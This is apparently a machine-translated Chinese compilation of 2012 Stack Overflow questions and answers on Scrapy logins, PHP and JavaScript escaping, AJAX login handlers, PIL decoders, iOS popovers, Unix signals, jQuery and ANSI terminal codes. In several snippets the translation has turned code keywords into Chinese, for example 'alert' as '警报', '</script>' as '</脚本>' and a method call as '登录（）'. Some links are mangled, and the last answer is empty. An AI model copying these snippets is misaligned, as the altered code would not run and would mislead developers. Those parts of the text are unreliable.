[http://www.mywebsite.com/mydb.nsf/myframe?Openframeset&Frame=ContentPH&Src=/mydb.nsf%2fDocument.xsp%3fdocumentID%3dxxxxxxxx%26action%3dreadDocument](http://www.mywebsite.com/mydb.nsf/myframe?Openframeset&Frame=ContentPH&Src=/mydb.nsf%2fDocument.xsp%3fdocumentID%3dxxxxxxxx%26action%3dreadDocument)

# python - Scrapy InIt self.initialized() -- 没有初始化

> ID：11271928
> 
> 赞同：2
> 
> 时间：2012-06-30T06:13:40.547
> 
> 标签：python, selenium, scrapy, web-crawler, scraper

我正在尝试使用 Scrapy 在 init 中登录网站，然后在确认登录后我想初始化并通过 start_urls 开始标准爬网。我不确定出了什么问题，但我对登录很清楚，每件事都确认了，但 parse_item 永远不会启动。任何帮助将不胜感激。

我可以得到它“================成功登录=================

但

我无法进入“===========================解析项目================ ===========

```
from scrapy.contrib.spiders.init import InitSpider
from scrapy.http import Request, FormRequest
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from scrapy.contrib.spiders import Rule
from selenium import webdriver

class ProductDetailsSpider(InitSpider):
    name = 'product_details_spider'
    allowed_domains = ['my_domain.com']
    login_page = 'http://www.my_domain.com/'
    start_urls = ['http://www.my_domain.com/nextpage1/',
                  'http://www.my_domain.com/nextpage2/',
                  'http://www.my_domain.com/nextpage3/']

    rules = (
        Rule(SgmlLinkExtractor(allow=()),
            callback='parse_item',
            follow=True),
        )

    def get_cookies(self):
        driver = webdriver.Firefox()
        driver.implicitly_wait(30)
        base_url = "http://www.my_domain.com"
        driver.get(base_url + "/")
        driver.find_element_by_name("USR").clear()
        driver.find_element_by_name("USR").send_keys("my_user")
        driver.find_element_by_name("PASSWRD").clear()
        driver.find_element_by_name("PASSWRD").send_keys("my_pass")
        driver.find_element_by_name("submit").click()
        cookies = driver.get_cookies()
        driver.close()
        cookie_dic = {}
        for c in cookies:
            cookie_dic[c['name']] = c['value']
        return cookie_dic

    def init_request(self):
        print '=======================INIT======================='
        """This function is called before crawling starts."""
        return Request(url=self.login_page, callback=self.login)

    def login(self, response):
        print '=======================LOGIN======================='
        """Generate a login request."""
        return [FormRequest.from_response(response,formname='login_form',
            formdata={'USR': 'my_user', 'PASSWRD': 'my_pass'},
            callback=self.login_cookies)]

    def login_cookies(self, response):
        print '=======================COOKIES======================='
        return Request(url='http://www.my_domain.com/home',
            cookies=self.get_cookies(),
            callback=self.check_login_response)

    def check_login_response(self, response):
        print '=======================CHECK LOGIN======================='
        """Check the response returned by a login request to see if we are
        successfully logged in.
        """
        if "Logoff" in response.body:
            print "=========Successfully logged in.========="
            self.initialized()
            # Now the crawling can begin..
        else:
            print "==============Bad times :(==============="
            # Something went wrong, we couldn't log in, so nothing happens.

    def parse_item(self, response):
        print "==============PARSE ITEM=========================="
    # Scrape data from page 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-30T07:28:04.707

我参加聚会有点晚了，但我很确定您需要返回 self.initialized()：

```
if "Logoff" in response.body:
    print "=========Successfully logged in.========="
    return self.initialized()
    # Now the crawling can begin.. 
```

# php - 如何将 javascript var 的 innerHTML 设置为 php/html 文本

> ID：11271934
> 
> 赞同：0
> 
> 时间：2012-06-30T06:15:07.113
> 
> 标签：php, javascript, html, escaping, innerhtml

我以为我知道如何逃避事情，但这只是让我大吃一惊。我需要使用这个 html/php 组合文本：

```
<select name="mainUsers" class="manageSelect">
<?php
     $users = getAllUsersByUserId($userid);
     echo'<option value="choose">Select a user...</option>';    
     while($user = mysql_fetch_array($users)) {
         echo'<option value='.$user['fname'].' '.$user['lname'].'>'.$user['fname'].' '.$user['lname'].'</option>';      
     }
?>
</select>; 
```

并将其设置为 javascript var 的 innerHTML。它崩溃了，因为我的转义语法不正确。

编辑：抱歉不清楚。这不起作用，我不知道为什么：

```
cell2.innerHTML = 
<?php
     echo '<select name="mainUsers" class="manageSelect">';
     $families = getAllFamiliesByUserId($userid);
     echo '<div id="famSelect"><option value="choose">Select a family...</option></div>';       
     while($family = mysql_fetch_array($families)) {
         echo '<div id="famSelect"><option value="'.$family['name'].'">'.$family['name'].'</option></div>';     
     }
     echo '</select>';
?>; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T06:53:31.453

您需要将 innerHTML 设置为包含 HTML 的字符串。在 JavaScript 中，您需要用引号分隔该字符串，因此：

```
cell2.innerHTML = 
<?php
    echo '\'<select name="mainUsers" class="manageSelect">';
    $families = getAllFamiliesByUserId($userid);
    echo '<div id="famSelect"><option value="choose">Select a family...</option></div>';       
    while($family = mysql_fetch_array($families)) {
        echo '<div id="famSelect"><option value="'.$family['name'].'">'.$family['name'].'</option></div>';     
    }
    echo '</select>\';';
?>; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T06:58:38.187

您的报价有问题，它肯定会引发 javascript 错误。现在你有如下代码：

```
cell2.innerHTML = <select>...</select> 
```

但应该是

```
cell2.innerHTML = '<select>...</select>' 
```

所以在你的php标签周围加上单引号

```
cell2.innerHTML = '<?php
//...
?>'; 
```

而且这项工作没有任何转义，因为您没有在 html 代码中使用任何单引号。但转义很简单：只需将所有单引号替换为 \'。像这样： cell2.innerHTML = '

```
<?php
     $html = '<select name="mainUsers" class="manageSelect">';
     $families = getAllFamiliesByUserId($userid);
     $html .= '<div id="famSelect"><option value="choose">Select a family...</option></div>';       
     while($family = mysql_fetch_array($families)) {
         $html .= '<div id="famSelect"><option value="'.$family['name'].'">'.$family['name'].'</option></div>';     
     }
     $html .= '</select>';
     echo addslashes($html);
     // Addslashes also slahses double quotes("). If this is causing problems try: echo str_replace("'", "\\'", $html);
?>'; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T06:35:09.457

您需要在**echo**和正在生成的字符串之间留一个空格。

此外，您生成的 HTML 不会在选项的 value 属性周围加上引号。

试试这个： `echo '<option value="'.$user['fname'].' '.$user['lname'].'">'.$user['fname'].' '.$user['lname'].'</option>';`

# javascript - IE9上传前显示图片预览

> ID：11271937
> 
> 赞同：6
> 
> 时间：2012-06-30T06:15:19.763
> 
> 标签：javascript

我想在上传之前显示图像。我尝试了以下代码，但它只在 firefox 中工作。但我需要让它在 IE 中工作。任何人都可以建议我最好的解决方案。我在下面给出我的代码可以任何人都知道我去了哪里我用谷歌搜索了将近一整天。但找不到我的解决方案这是我的代码

```
enter code here

function loadname(img, previewName) {
      var isIE = (navigator.appName == "Microsoft Internet Explorer");
      var path = img.value;
      var ext = path.substring(path.lastIndexOf('.') + 1).toLowerCase();
      if (ext == "gif" || ext == "jpeg" || ext == "jpg" || ext == "png") {
          if (isIE) {
              alert(path);
              $('#' + previewName).attr('src', path);
          } else {
              if (img.files[0]) {
                  var reader = new FileReader();
                  reader.onload = function (e) {
                      $('#' + previewName).attr('src', e.target.result);
                  }
                  reader.readAsDataURL(img.files[0]);
              } 
          }
      } 
  } 
```

我的html是

```
 <body><form method="post" > 
<input type="file" class="file" onchange="loadname(this,'previewimg')" id="file" /><img src="about:blank" name="previewimg" id="previewimg" alt="" style="width:2in; height:2in"/> 

</form> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-30T06:37:20.183

出于安全原因，IE9 不支持访问客户端计算机上的文件，这就是您看不到任何预览的原因。您需要将图像上传到您的服务器然后显示它。

**鸟瞰图**

一种方法是在上传时显示进度条，同时使用 ajax 将文件保存到服务器上的临时文件夹中，并将图像名称作为临时 ID 并将 ID 存储在数据库中（以便您以后可以删除它) 然后将其显示在图像控件中。如果您稍后需要删除文件，只需使用 ID 将其删除，或者如果您需要保存，请将其移动到您的图像文件夹。

# php - 将 ajax 数据获取到 php 文件中

> ID：11271939
> 
> 赞同：0
> 
> 时间：2012-06-30T06:15:41.923
> 
> 标签：php, ajax

我正在尝试使用 ajax 和 php 构建登录系统。我使用日志视图，然后将数据保存在 ajax 中，这会带入我的 doLogin.php（php 文件）。我的问题是当我将 php 文件构建到一个类和一个函数中时，它永远不应该是任何 ajax 数据

看法：

```
public function DoLoginBox() {  
    //inloggning form-tagg...
    return '<p>&nbsp;</p>
        <div id="content">
          <h1>Login Form</h1>
          <form id="form1" name="form1" action="Handler/doLogin.php"  method="post">
            <p>
              <label for="username">Username: </label>
              <input type="text" name="username" id="username" />
            </p>
            <p>
              <label for="password">Password: </label>
              <input type="password" name="password" id="password" />
            </p>
            <p>
              <input type="submit" id="login" name="login" />
            </p>
          </form>
            <div id="message"></div>
        </div>';
} 
```

阿贾克斯：

```
<script type="text/javascript">
 $(document).ready(function() {
$("#login").click(function() {
    var action = $("#form1").attr('action');
    var form_data = {
        username: $("#username").val(),
        password: $("#password").val(), 
        is_ajax: 1
    };
    $.ajax({
        type: "POST",
        url: action,
        data: form_data,
        success: function(response)
        {
            if(response == 'success')
                $("#form1").slideUp('slow', function() {
                    $("#message").html("<p class='success'>You have logged in successfully!</p>");
                });
            else
                $("#message").html("<p class='error'>Invalid username and/or password.</p>");   
        }
    });
    return false;
});
});
</script 
```

PHP：

```
 <?php
 require_once ("UserHandler.php");
 class DoLogingHandler{

public function Login (){
    $is_ajax = !empty($_REQUEST['is_ajax']);

    if(isset($is_ajax) && $is_ajax)
    {
        $username = $_REQUEST['username'];
        $password = $_REQUEST['password'];
        $UserHandler = new UserHandler();
        $UserHandler -> controllDB($username,$password);

        if($username == 'demo' && $password == 'demo')
        {
            echo "success";

        }
    }
} 
```

} ` $DoLogingHandler = new DoLogingHandler(); $DoLogingHandler->登录（）；?>

* * *

如果我在 stack.php 中添加类和函数，我会得到“连接到服务器时出错”（我希望将此代码放入一个类和函数中以调用其他函数：

```
<?php
class DologinHandler{  
public function Login(){ 
if(isset($_REQUEST['is_ajax']))
    {
        $username = $_REQUEST['username'];
        $password = $_REQUEST['password'];
        //$UserHandler = new UserHandler();
        //$UserHandler -> controllDB($username,$password);
        if($username == 'demo' && $password == 'demo')
        {
            exit('success');
        } else {
            exit('error');
        }
    }
} 
```

} ?>

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T09:12:47.920

用这个

第一个文件**classes.php**

```
<?php
class loginHandler{
    public static function doLogin(){
        if(!isset($_POST['is_ajax']) || !isset($_POST['username'])  || !isset($_POST['password'])){
            return false;
        }
        if(isset($_REQUEST['is_ajax']))
        {
            $username = $_REQUEST['username'];
            $password = $_REQUEST['password'];
            //$UserHandler = new UserHandler();
            //$UserHandler -> controllDB($username,$password);
            if($username == 'demo' && $password == 'demo')
            {
                exit('success');
            } else {
                exit('error');
            }
        }
    }
}
?> 
```

第二个文件**index.php**

```
<?php
    require_once('classes.php');
    loginHandler::doLogin();//for static methods
    /*
        //or use this syntax for non static method
        $c = new loginHandler;
        $c->doLogin();
    */
?>
<html>
<head> <title>1</title>
<script type="text/javascript" src="jquery.js" ></script>  
</head>
<body>
<p>&nbsp;</p>
<div id="content">
  <h1>Login Form</h1>
  <form id="form1" name="form1" action="index.php"  method="post" onsubmit="return loginMe()">
    <p>
      <label for="username">Username: </label>
      <input type="text" name="username" id="username" />
    </p>
    <p>
      <label for="password">Password: </label>
      <input type="password" name="password" id="password" />
    </p>
    <p>
      <input type="submit" id="login" name="login"/>
    </p>
  </form>
    <div id="message"></div>
</div>
<script type="text/javascript">
    function loginMe(){
        var action = $("#form1").attr('action');
        var form_data = {
            username: $("#username").val(),
            password: $("#password").val(), 
            is_ajax: 1
        };
        $.ajax({
            type: 'POST',
            url: action,
            data: form_data,
            success: function(data){
                if(typeof(data) != 'undefined' && (data == 'success' || data == 'error')){
                    if($.trim(data) == 'success'){
                        $("#form1").slideUp('slow', function() {
                            $("#message").html("<p class='success'>You have logged in successfully!</p>");
                        });
                    } else if($.trim(data) == 'error'){
                        $("#form1").slideUp('slow', function() {
                            $("#message").html("<p class='error'>Invalid username and/or password.</p>");
                        });
                    }
                } else {
                    console.log(data);
                    $("#message").html("<p class='error'>Error to connect to server</p>");   
                }
            }
        });
        return false;
    }
</script>
</body>
</html> 
```

# python - PIL zip jpeg 解码器在运行时不工作，但在安装/自检时工作

> ID：11271941
> 
> 赞同：1
> 
> 时间：2012-06-30T06:16:29.477
> 
> 标签：python, python-imaging-library, zlib, libjpeg

我正在运行 Debian 6 并且最近安装了 PIL。

我已经预装了 zlib 和 jpeg 库，它们都在 /usr/lib

安装时，setup.py 文件找到库，我得到标准：

```
--------------------------------------------------------------------
PIL 1.1.7 SETUP SUMMARY
--------------------------------------------------------------------
version       1.1.7
platform      linux2 2.7.3 (default, Jun 29 2012, 22:38:23)
              [GCC 4.4.5]
--------------------------------------------------------------------
*** TKINTER support not available
--- JPEG support available
--- ZLIB (PNG/ZIP) support available
--- FREETYPE2 support available
--- LITTLECMS support available 
```

zlib 和 jpeg 正在按预期工作。运行 selftest.py 也成功

```
--------------------------------------------------------------------
PIL 1.1.7 TEST SUMMARY
--------------------------------------------------------------------
Python modules loaded from ./PIL
Binary modules loaded from ./PIL
--------------------------------------------------------------------
--- PIL CORE support ok
*** TKINTER support not installed
--- JPEG support ok
--- ZLIB (PNG/ZIP) support ok
--- FREETYPE2 support ok
--- LITTLECMS support ok
--------------------------------------------------------------------
Running selftest:
--- 57 tests passed. 
```

所以到目前为止，我们都很高兴。

只是为了确保，我们运行 python 并测试 zlib 解码器是否有效

```
Python 2.7.3 (default, Jun 29 2012, 22:38:23)
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import zlib
>>> a=zlib.compress('hello world')
>>> print zlib.decompress(a)
hello world 
```

所以，它有效。

但是，当我尝试保存图像时：

```
>>> import Image
>>> i = Image.open('a.png')
>>> i.save('b.png')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/local/lib/python2.7/site-packages/PIL/Image.py", line 1406, in save
    self.load()
  File "/usr/local/lib/python2.7/site-packages/PIL/ImageFile.py", line 189, in load
    d = Image._getdecoder(self.mode, d, a, self.decoderconfig)
  File "/usr/local/lib/python2.7/site-packages/PIL/Image.py", line 385, in _getdecoder
    raise IOError("decoder %s not available" % decoder_name)
IOError: decoder zip not available 
```

如果我尝试另存为 jpeg，则会出现同样的错误（除了 jpeg 解码器不可用）

如果我检查 Image.core，我发现实际上没有 zip_decoder 和 jpeg_decoder 属性。

```
>>> dir(Image.core)
['__doc__', '__file__', '__name__', '__package__', 'bit_decoder', 'blend', 'convert',
'copy', 'crc32', 'draw', 'effect_mandelbrot', 'effect_noise', 'eps_encoder', 'fill', 
'fli_decoder', 'font', 'getcodecstatus', 'getcount', 'gif_decoder', 'gif_encoder',
'hex_decoder', 'hex_encoder', 'linear_gradient', 'map_buffer', 'msp_decoder', 'new', 
'open_ppm', 'outline', 'packbits_decoder', 'path', 'pcd_decoder', 'pcx_decoder', 
'pcx_encoder', 'radial_gradient', 'raw_decoder', 'raw_encoder', 'sun_rle_decoder', 
'tga_rle_decoder', 'tiff_lzw_decoder', 'wedge', 'xbm_decoder', 'xbm_encoder'] 
```

正如我所见，我无法找出它是什么，即使它在安装时找到了正确的库（所以安装程序找不到库不是问题，它找到了它们），核心对象是在没有适当的解码器。

多次尝试重新安装 PIL，检查 /usr/lib 目录和 .so 文件的权限。以 root 身份运行 PIL 以查看是否存在任何问题。但仍然没有答案。

如果有人可以帮助解决这个问题，那就太好了！

提前致谢。

布鲁诺

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T07:24:02.503

解决问题的一个简单方法是使用[Pillow](http://pypi.python.org/pypi/Pillow) not `PIL`。

> Pillow 是“友好”的 PIL 前叉。PIL 是 Python 图像库。Pillow 是为 Plone 社区启动的，目前由 Plone 社区维护。但它被 Python 网络社区中的许多其他人使用，可能在其他地方也是如此。

首先，`pip uninstall PIL`删除已安装的 PIL，

然后，键入`pip install pillow`。

# ipad - 使用导航控制器更改 UIPopoverView 大小

> ID：11271942
> 
> 赞同：1
> 
> 时间：2012-06-30T06:16:34.943
> 
> 标签：ipad, uinavigationcontroller, uipopovercontroller, segue

我已经`UIPopover`为 ipad实现了一个`navigation controller`内部视图。最初弹出视图的大小很小，当我推到另一个视图时会变大。

但是当我按下后退按钮时，只有宽度减小回小，但高度保持不变。我已经从右舷明确设置了视图大小，并且弹出框是通过 segue 进行的。你能帮帮我吗！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-22T09:54:04.490

Try subclassing UINavigationController and overriding its contentSizeForViewInPopover. This works for me :)

It seems that by default UINavigationController looks only at width of it's child view controllers. (or perhaps only grows in height?)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T06:21:52.167

在 View Controller 中，实现`-(CGSize) contentSizeForViewInPopover`并返回所需大小的 CGRect。这是在运行时使用 get 来确定大小。故事板设置只是一个存档的初始化值。[此处的文档](http://developer.apple.com/library/ios/#DOCUMENTATION/UIKit/Reference/UIViewController_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40006926-CH3-SW65)还提到了您可能需要考虑的一些边缘情况（在呈现视图控制器时实际上存在一系列责任，事情可能会开始变得复杂，但这还不错）

# c - 如何让子进程等待其兄弟？

> ID：11271943
> 
> 赞同：1
> 
> 时间：2012-06-30T06:16:42.137
> 
> 标签：c, unix, ipc, process

我正在按照 [Mat][1] 的建议使用 IPC 来解决它，但我仍然无法做到
，顺便说一下，这是示例练习，而不是家庭作业！但是我要考试了，所以
请在这里帮助我... :)
有人在这里指出我做错了什么。Kid2 没有发送或父母没有收到来自孩子 2 的任何信号。

谢谢。

```
#include<stdio.h>  
#include<sys/wait.h>  
#include<wait.h>  
#include<signal.h>  

void my_handler_for_kid2(int sig_num){  
  printf("KID2:Recieved SIGUSR1 from KID1\n");  
}  
void my_handler_for_parent(int sig_num){  
  printf("PARENT:Recieved SIGUSR2 from KID2\n");  
}  

int main(){  
  int status;  
 pid_t kid1,kid2;  

  void my_handler_for_kid2(int sig_num);  
  void my_handler_for_parent(int sig_num);  
  signal(SIGUSR1,my_handler_for_kid2);
  signal(SIGUSR2,my_handler_for_parent);
  kid1=fork();  
  if(kid1 < 0){  
    printf("Fork not successfull\n");  
  }  
  else if(kid1 == 0){  
    printf("I am KID1[%ld] and I am going to sleep\n",(long) getpid());  
    sleep(5);  
    printf("Just woke up!\n");  
    kill(kid2,SIGUSR1);  
      }  
  else{  
    kid2=fork();  
    if(kid2 < 0){ 
      printf("Fork not successfull\n");  
    }  
    else if(kid2 == 0){  
      printf("I am KID2[%ld] and I am going to wait for KID1 to wakeup\n",(long)       getpid());  
      pause(); 
      //signal(SIGUSR1,my_handler_for_kid2);  
      kill(getppid(),SIGUSR2);  
    }  
    else{  
      printf("Father[%ld] here and going to wait for both kids to respond to me\n",    (long) getpid());  
      pause();
      //signal(SIGUSR2,my_handler_for_parent);  
      waitpid(kid1,&status,NULL);  
      waitpid(kid2,&status,NULL);  
    }  
 }  
} 

rizwan@riz-pc:~/Documents$ ./a.out
I am KID1[2278] and I am going to sleep
 Father[2277] here and going to wait for both kids to respond to me
 I am KID2[2279] and I am going to wait for KID1 to wakeup
 Just woke up!
KID2:Recieved SIGUSR1 from KID1
^C
rizwan@riz-pc:~/Documents$ 

  [1]: http://stackoverflow.com/users/635608/mat 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-30T06:33:27.753

从[POSIX](http://pubs.opengroup.org/onlinepubs/9699919799/functions/waitpid.html)：

> **wait() 和 waitpid() 函数应获取与调用者的子进程之一**有关的状态信息。

您不能使用这些函数在兄弟姐妹之间进行同步，只能从一个等待其子代的父代同步。
您需要使用一些“真正的”同步原语来实现您所追求的（信号量或其他形式的[IPC](http://en.wikipedia.org/wiki/Inter-process_communication)）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T08:37:44.527

互斥同步可以工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-04T09:35:40.333

为此，您应该使用条件变量。从网上获取任何教程。

# jquery - 为此实施垃圾的最简单方法

> ID：11271946
> 
> 赞同：0
> 
> 时间：2012-06-30T06:17:10.840
> 
> 标签：jquery, drag-and-drop

[http://jsfiddle.net/fzTak/7/](http://jsfiddle.net/fzTak/7/)

我在stackoverflow上遇到了一篇文章，但它没有垃圾功能从可排序列表中删除单个项目，以及我们如何实现可排序列表的大小（这意味着如果我们给5作为可排序的大小列表，那么它必须有 5 个元素，在第 6 个元素下降时，它必须以某种方式发出警报）

非常感谢您对此的任何帮助

问候火焰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T07:01:06.740

要仅删除单个项目而不是全部，您可以在将 find(class) 拖回时将其替换为 find(itembeingdragged)：

```
 $( ".draggable" ).droppable({

        drop: function  (event, ui) {
                          $("#sortable").find(ui.draggable).remove();
        } 

    }); 
```

当然，这意味着如果您还想要*全部删除*，则必须单独实施

至于最大数量：一种方法是通过让拖动事件在可拖动对象内返回 false 来停止拖动（基于项目数）

```
 $( ".draggable" ).draggable({

        connectToSortable: "#sortable",

        helper: "clone",

        revert: "invalid",

        drag: function(){
            var cnt = $("#sortable").find("li").size();
            return cnt < 5;
        }

    }); 
```

不知道停止拖动是否可以接受，但我认为这是给定场景中最简单的方法:)

更新的小提琴：http: [//jsfiddle.net/fzTak/20/](http://jsfiddle.net/fzTak/20/)

# php - 将 img src 更改为直接链接，用于照片库

> ID：11271949
> 
> 赞同：0
> 
> 时间：2012-06-30T06:17:46.240
> 
> 标签：php, image, file-get-contents, src

我正在尝试创建一个接受用户输入的 URL 的页面，然后它将显示来自该地址的所有图像。我有这个工作，但是如果页面上的图像 src 是这样写的：

```
/image/picture.jpg 
```

而不是这样：

```
http://www.site.com/image/picture.jpg 
```

然后我的页面不会显示它，因为它不是我的服务器本地的。我想知道，有没有一种简单的方法可以直接链接到该文件位置？

我的代码如下：

```
<?php 
$html = file_get_contents('http://www.deviantart.com/');

$dom = new domDocument;
@$dom->loadHTML($html);
$dom->preserveWhiteSpace = false;
$images = $dom->getElementsByTagName('img');
foreach ($images as $image) {
  $data = $image->getAttribute('src');
  echo "<img src='".$data."' />";
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T06:43:34.070

只需将站点 url 添加到 src 元素。如果 src 以 http:// 开头，我也会添加检查

```
foreach ($images as $image) {
  $data = $image->getAttribute('src');
  if (!preg_match('/https?:\/\//i', $data)) {
    // If src attribute does not start with "http://" or "https://", then prepend site base url
    $data = 'http://site.com/' . ltrim($data, '/');
  }
  echo "<img src='".$data."' />";
} 
```

# xcode - 如何在 Xcode 4.3.3 中自定义 Mac 应用程序工具栏？

> ID：11271950
> 
> 赞同：1
> 
> 时间：2012-06-30T06:18:03.820
> 
> 标签：xcode, macos, cocoa, xcode4, interface-builder

在 Xcode 3 中，双击 Interface Builder 中的工具栏会打开一个配置窗口来设置工具栏的初始外观——就像工具栏中最初显示的项目一样。然而，在 Xcode 4 中，双击工具栏（在窗口设计器中）并没有做任何事情。

如何在 Xcode 4 中自定义我的应用程序窗口的工具栏？我在 Lion 上使用 Xcode 4.3.3 并开发 Mac 应用程序。

注意：这*不是*关于自定义 Xcode 的工具栏，而是自定义正在 Xcode 中开发的应用程序的工具栏

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T06:54:38.810

当您在 Xcode 4 的界面编辑器中双击窗口的工具栏时，会出现一个带有“Allowed Toolbar Items”和“Default Toolbar Items”的工作表。（您也可以按住 Option 键单击查看。）

虽然您不能将项目直接拖到模拟窗口的工具栏中，但是如果您将项目拖到工作表的“默认工具栏项目”部分（工作表的下半部分），该工具栏中显示的项目将会改变。您还可以拖动该部分中的项目以重新排列它们。

请注意，必须先将项目拖到“允许的工具栏项目”中，然后才能将它们拖到“默认工具栏项目”中。

# c# - 命令提示符不显示

> ID：11271952
> 
> 赞同：0
> 
> 时间：2012-06-30T06:18:12.603
> 
> 标签：c#, console, cmd

> **可能重复：**
> [从 Web 应用程序 c# 调用 (.exe) 控制台应用程序时，命令提示符不会打开](https://stackoverflow.com/questions/11271356/command-prompt-do-not-opens-up-when-calling-exe-console-application-from-web)

我正在使用未隐藏命令提示符的控制台应用程序。我从另一个 Web 应用程序调用此应用程序。当我在 Visual Studio 中运行 Web 应用程序时，它显示命令提示符已打开，但是当我在**IIS**上托管此 Web 应用程序时，命令提示符不会显示，但进程正在后端某处运行。谁能给出一些想法，为什么从**IIS调用控制台应用程序时会显示命令提示符**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T06:20:01.920

您的 Web 应用程序没有在交互式用户的上下文中运行 - 它在 Windows 服务的上下文中运行，该服务通常不、不应该也不能与桌面交互。（您*可以*允许服务与桌面交互，但我认为您*不应该*，至少对于 IIS...）

# c++ - 如何通过编程删除标准输出中的字符？

> ID：11271956
> 
> 赞同：0
> 
> 时间：2012-06-30T06:18:52.090
> 
> 标签：c++, terminal, escaping, ansi-escape

我想在编程中模拟退格并实现如下。

```
// del.cpp
#include <iostream>
using namespace std;

int main()
{
    cout << "123456";
    cout << "\b\b\b" /* backspace key */<< '\x7f' /* DEL key */ << '\x7f' << '\x7f';
    cout << endl;
    return 0;
} 
```

但我得到这样的结果 ![在此处输入图像描述](../Images/ec0085c4232cc9ee6f5510500dad0e15.png)

如何在不需要用空格替换尾部的情况下获得如下所示的结果

```
123 
```

也就是说，如何删除而不是替换光标后退格的那些字符。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T06:42:50.310

使用“清除到行尾”转义序列，`CSI K`.

```
cout << "123456";
cout << "\b\b\b\033[K";
cout << endl; 
```

有关转义序列的列表，请参阅[ANSI Escape Code (Wikipedia)](http://en.wikipedia.org/wiki/ANSI_escape_code)。当然，不是所有的都可以在所有终端上运行，但是现在有了软件终端，我就不用担心了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T06:20:55.473

您不需要 '\b' 之后的 0x7f。只有那些角色出现了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T06:37:25.523

没有通用的方法在所有系统中都适用于 DEL 字符，因为不同的终端以不同的方式实现它。如果您希望它在所有终端中工作，您必须使用空格覆盖。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T06:39:24.037

您将不得不使用您的操作系统 API 来完成此任务。

# javascript - 如何使用 jQuery 在多个单选按钮中选择最新选中的单选按钮

> ID：11271957
> 
> 赞同：0
> 
> 时间：2012-06-30T06:18:53.223
> 
> 标签：javascript, jquery, html

在这篇文章中，如何使用 jquery 选择用户选择的最新单选按钮

```
<form id = "myform">
<h3>Time to work?</h3>
  <p>
    <input type="radio" name="work" value="Hourly" />
    <input type="radio" name="work" value="Daily" />
    <input type="radio" name="work" value="Weekly" />
  </p>
<h3>Your Age?</h3>   
  <p>
    <input type="radio" name="age" value="old" />
    <input type="radio" name="age" value="young" />
    <input type="radio" name="age" value="child" />
  </p>
</form> 
```

我试过了

```
$('input:checked', '#myform').val(); 
```

和

```
$('input[type='radio']:checked', '#myform').val(); 
```

但它总是选择第一个问题的唯一值！有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:27:49.867

尝试为每个单选按钮添加一个“点击”侦听器。然后只需将值存储在变量中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T06:29:36.970

尝试这个 ：

```
<script type="text/javascript">
jQuery("input[type=radio]").click(function(){
    警报(jQuery(this).val());
});
</脚本>

```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T06:29:34.027

好吧，您可能会通过代码中的语法突出显示注意到单引号和双引号的一些语法错误。此外，您还需要使用 name 属性，而不仅仅是`input`：

```
$('input[name="age"]:checked').val() 
```

**演示：http:** [//jsfiddle.net/elclanrs/bHWv7/](http://jsfiddle.net/elclanrs/bHWv7/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T06:30:01.483

`$('input[name=radioName]:checked', '#myForm').val()`应该给你选择的单选按钮值。也`$('input[name=myradiobutton]:radio:checked')`应该工作正常。

# iphone - 视图中的 UITapGesture 时不调用 UIButton 操作

> ID：11271959
> 
> 赞同：3
> 
> 时间：2012-06-30T06:19:44.757
> 
> 标签：iphone, objective-c, uigesturerecognizer, uitapgesturerecognizer

我有一个视图，在那个视图上我添加了一个`UITapGesture`. 现在，当我在视图中放置一个按钮并单击该按钮时，它不会调用按钮操作。

这是我的代码：

```
 ButtionView=[[UIView alloc]initWithFrame:CGRectMake(x, y, 84, 84)];
    ButtionView.tag=i;
    UIImageView *coverImageView = [[UIImageView alloc]     

    initWithFrame:CGRectMake(0,0,ButtionView.frame.size.width,84)];
    coverImageView.tag = i;
    UIButton *notesbutton=[UIButton buttonWithType:UIButtonTypeRoundedRect];
    notesbutton.frame=CGRectMake(0, 0,20,20);
    notesbutton.tag=i;

    [notesbutton addTarget:self action:@selector(buttonClickedForNotes:)      
    forControlEvents:UIControlEventTouchUpInside];
    [ButtionView addSubview:coverImageView];
    [ButtionView addSubview:notesbutton];
    [notesbutton bringSubviewToFront:ButtionView];
    [self.scrollview addSubview:ButtionView];
    [ButtionView addGestureRecognizer:oneFingerSingleTap];

-(IBAction)buttonClickedForNotes:(id) sender
{
    NSLog(@"buttion action call");

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:43:08.930

首先，订阅 UITapGesture 的委托。

```
[singleTapGestureRecognizer setDelegate:self]; 
```

然后，您必须将按钮设为您所在类的 ivar。然后，将此方法添加到您的类中：

```
- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldReceiveTouch:(UITouch *)touch
{
    // Check if the touch was on the button. If it was,
    // don't have the gesture recognizer intercept the touch
    if (CGRectContainsPoint(notesButton.frame, [touch locationInView:self.view]))
        return NO;
    return YES;       
} 
```

希望这有帮助。

* * *

## 回答 #2

